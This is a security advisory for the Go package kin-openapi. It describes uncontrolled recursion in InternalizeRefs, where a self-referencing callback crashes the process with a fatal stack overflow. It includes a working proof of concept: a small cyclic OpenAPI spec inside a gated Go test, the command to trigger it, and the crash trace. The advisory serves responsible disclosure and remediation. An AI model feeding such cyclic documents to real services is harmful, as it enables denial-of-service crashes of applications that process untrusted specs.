### Summary

`T.InternalizeRefs` in `github.com/getkin/kin-openapi/openapi3` recurses through
operation `Callbacks` and their `PathItem`s without any cycle detection. An
OpenAPI document containing a callback that (directly or transitively) `$ref`s
itself loads without error, but when an application later calls
`doc.InternalizeRefs(ctx, nil)`, the internal traversal `derefPaths` recurses
forever and the Go runtime aborts the entire process with an unrecoverable
`fatal error: stack overflow`. This is a denial-of-service: the crash cannot be
caught with `recover()`, so a single crafted document takes down the whole
process (and any other work it was doing).

### Details

`InternalizeRefs` walks the document to inline external references. Path items
are traversed by `derefPaths` (openapi3/internalize_refs.go). For every
operation it iterates the operation's callbacks, and for each callback it maps
the callback to its set of `PathItem`s and calls `derefPaths` **recursively**:

```go
// openapi3/internalize_refs.go  (func derefPaths, starts ~line 454)
func (doc *T) derefPaths(paths map[string]*PathItem, refNameResolver RefNameResolver, parentIsExternal bool) {
	for _, name := range componentNames(paths) {          // line 455
		ops := paths[name]
		...
		for _, name := range componentNames(opsWithMethod) {
			op := opsWithMethod[name]
			...
			for _, name := range componentNames(op.Callbacks) {
				cb := op.Callbacks[name]
				isExternal := doc.addCallbackToSpec(cb, refNameResolver, pathIsExternal)
				if cb.Value != nil {
					cbValue := (*cb.Value).Map()
					doc.derefPaths(cbValue, refNameResolver, pathIsExternal || isExternal) // line 480 — recursion
				}
			}
			...
		}
	}
}
```

The recursive descent at line 480 has **no guard** against revisiting a
`*Callback` or `*PathItem` that is already on the current recursion path. When a
callback's path item contains an operation whose callback `$ref`s back to the
same callback component, `(*cb.Value).Map()` resolves the ref, hands back the
same path items, and `derefPaths` calls itself again on structurally identical
data — forever.

The root cause is a missing visited-set. `InternalizeRefs` calls
`doc.resetVisited()` and the recursion-hardening machinery in
`openapi3/visited.go` deduplicates two component kinds only:

```go
// openapi3/visited.go
type visitedComponent struct {
	header map[*Header]struct{}
	schema map[*Schema]struct{}
}

func (doc *T) isVisitedHeader(h *Header) bool { ... } // guards Header recursion
func (doc *T) isVisitedSchema(s *Schema) bool { ... } // guards Schema recursion
```

There is `isVisitedSchema` for `*Schema` and `isVisitedHeader` for `*Header`, so
cyclic schemas and cyclic headers are handled correctly. There is **no**
`map[*Callback]struct{}` or `map[*PathItem]struct{}` and no corresponding
`isVisited...` check, so the callback/path-item recursion in `derefPaths` is
completely unbounded. A cyclic callback therefore drives the recursion until the
goroutine stack is exhausted.

Because a Go stack overflow is a `fatal error` (not a `panic`), it is
**unrecoverable**: `recover()` does not intercept it and the entire process
terminates. An application that accepts untrusted OpenAPI documents and runs
`InternalizeRefs` on them (e.g. spec bundling / flattening tooling) can be
crashed by a single small document.

Note the precondition: the vulnerability is **not** on the default load path.
Merely loading/validating the document is safe — the crash requires the
application to invoke the opt-in `InternalizeRefs` API on the untrusted
document.

### PoC

The following self-contained Go test reproduces the crash. Because a stack
overflow kills the whole test binary and is unrecoverable, the test is gated
behind the `POC_RUN=1` environment variable so that an ordinary `go test ./...`
run is unaffected (it simply skips).

Save as `openapi3/advisory_poc_test.go`:

```go
package openapi3_test

import (
	"context"
	"os"
	"testing"

	"github.com/getkin/kin-openapi/openapi3"
)

const specCyclicCallback = `
openapi: 3.0.0
info: {title: PoC, version: 1.0.0}
paths:
  /p:
    post:
      responses: {'200': {description: ok}}
      callbacks:
        cb:
          $ref: '#/components/callbacks/Loop'
components:
  callbacks:
    Loop:
      '{$request.body#/u}':
        post:
          responses: {'200': {description: ok}}
          callbacks:
            cb:
              $ref: '#/components/callbacks/Loop'
`

// TestPoCCyclicCallbackStackOverflow demonstrates unbounded recursion in
// InternalizeRefs on a document with a self-referential callback.
//
// WARNING: this WILL crash the test process with "fatal error: stack
// overflow" (a stack overflow is unrecoverable). It is gated behind
// POC_RUN=1 so a normal `go test ./...` is unaffected. Run it explicitly:
//
//	POC_RUN=1 go test ./openapi3/ -run TestPoCCyclicCallbackStackOverflow -v
func TestPoCCyclicCallbackStackOverflow(t *testing.T) {
	if os.Getenv("POC_RUN") == "" {
		t.Skip("set POC_RUN=1 to run; this WILL crash the process with a fatal stack overflow")
	}
	loader := openapi3.NewLoader()
	doc, err := loader.LoadFromData([]byte(specCyclicCallback))
	if err != nil {
		t.Fatalf("load: %v", err)
	}
	t.Log("document loaded; calling InternalizeRefs (expect fatal stack overflow if vulnerable)")
	doc.InternalizeRefs(context.Background(), nil)
	t.Fatal("returned without crashing: code appears patched")
}
```

Run the two commands:

```console
# 1) Safe by default — no POC_RUN => the test SKIPs, suite stays green:
$ go test ./openapi3/ -run TestPoCCyclicCallbackStackOverflow -v
=== RUN   TestPoCCyclicCallbackStackOverflow
    advisory_poc_test.go:42: set POC_RUN=1 to run; this WILL crash the process with a fatal stack overflow
--- SKIP: TestPoCCyclicCallbackStackOverflow (0.00s)
PASS
ok  	github.com/getkin/kin-openapi/openapi3	0.016s

# 2) Explicit — triggers the vulnerability (crashes the process):
$ POC_RUN=1 go test ./openapi3/ -run TestPoCCyclicCallbackStackOverflow -v
```

Observed output (top of the fatal trace, Go 1.25.0):

```
=== RUN   TestPoCCyclicCallbackStackOverflow
    advisory_poc_test.go:49: document loaded; calling InternalizeRefs (expect fatal stack overflow if vulnerable)
runtime: goroutine stack exceeds 1000000000-byte limit
runtime: sp=0xc022300368 stack=[0xc022300000, 0xc042300000]
fatal error: stack overflow

runtime stack:
runtime.throw({0xa01c2b?, 0xffffffffffffffff?})
	.../src/runtime/panic.go:1094 +0x48 ...
runtime.newstack()
	.../src/runtime/stack.go:1159 +0x5bd ...
runtime.morestack()
	.../src/runtime/asm_amd64.s:620 +0x7d ...

goroutine 21 gp=0xc000103880 m=7 mp=0xc0005e0008 [running]:
runtime.makeslice(0x93fde0?, 0x0?, 0x1?)
	.../src/runtime/slice.go:101 +0xb3 ...
github.com/getkin/kin-openapi/openapi3.componentNames[...](0xc0216827e0)
	.../openapi3/helpers.go:69 +0x4c ...
github.com/getkin/kin-openapi/openapi3.(*T).derefPaths(0xc000339a00, 0xc0216827e0, 0xa51270, 0x0)
	.../openapi3/internalize_refs.go:455 +0x49 ...
github.com/getkin/kin-openapi/openapi3.(*T).derefPaths(0xc000339a00, 0xc021682780, 0xa51270, 0x0)
	.../openapi3/internalize_refs.go:480 +0x51b ...
github.com/getkin/kin-openapi/openapi3.(*T).derefPaths(0xc000339a00, 0xc021682720, 0xa51270, 0x0)
	.../openapi3/internalize_refs.go:480 +0x51b ...
github.com/getkin/kin-openapi/openapi3.(*T).derefPaths(0xc000339a00, 0xc0216826c0, 0xa51270, 0x0)
	.../openapi3/internalize_refs.go:480 +0x51b ...
	... (frame at internalize_refs.go:480 repeats until the stack is exhausted) ...
```

The unbounded self-recursion of `T.derefPaths` at `openapi3/internalize_refs.go:480`
(each frame re-entering the function at line 455) is the DoS. Because it is a
`fatal error: stack overflow`, no `recover()` can save the process.

### Impact

- **Type:** Uncontrolled recursion leading to unrecoverable stack-overflow
  denial of service (whole-process crash).
- **Who is affected:** Any application that calls `(*openapi3.T).InternalizeRefs`
  on an OpenAPI document obtained from an untrusted or semi-trusted source. This
  API is commonly used by spec bundling / flattening / offline-packaging tooling
  to inline external `$ref`s.
- **Trigger:** A single small document with a callback that `$ref`s itself
  (directly or through a cycle of callbacks). The document passes normal loading
  and validation; the crash occurs only when `InternalizeRefs` is invoked.
- **Consequence:** The Go runtime aborts the process with
  `fatal error: stack overflow`. The error is a runtime fatal error, not a
  panic, so it **cannot** be mitigated with `recover()`; the process (and all
  concurrent requests it was serving) dies.
- **Precondition / scope note:** Exploitation requires the application to invoke
  the opt-in `InternalizeRefs` API on the attacker-influenced document. Programs
  that only load and validate documents are not affected. This raised attack
  complexity is reflected in the CVSS `AC:H`.
- **Confidentiality / Integrity:** None. The only impact is availability.

---

- **Ecosystem:** Go
- **Package:** `github.com/getkin/kin-openapi`
- **Affected versions:** all released versions up to and including `v0.145.0`
- **CVSS v3.1:** 5.9 (Medium) — `AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H`
  (`AC:H` because exploitation additionally requires the application to invoke
  the opt-in `InternalizeRefs` API on the untrusted document, not the default
  load path)
- **CWE:** primary CWE-674 (Uncontrolled Recursion); also CWE-400 (Uncontrolled
  Resource Consumption) and CWE-770 (Allocation of Resources Without Limits or
  Throttling)
- **Advisory relationship:** Novel. Prior recursion-hardening added cycle
  detection for schemas (`isVisitedSchema`) and headers (`isVisitedHeader`) in
  `InternalizeRefs`, and for `$ref` resolution in the loader; the
  callback/path-item recursion in `InternalizeRefs` was not covered by any
  published advisory.
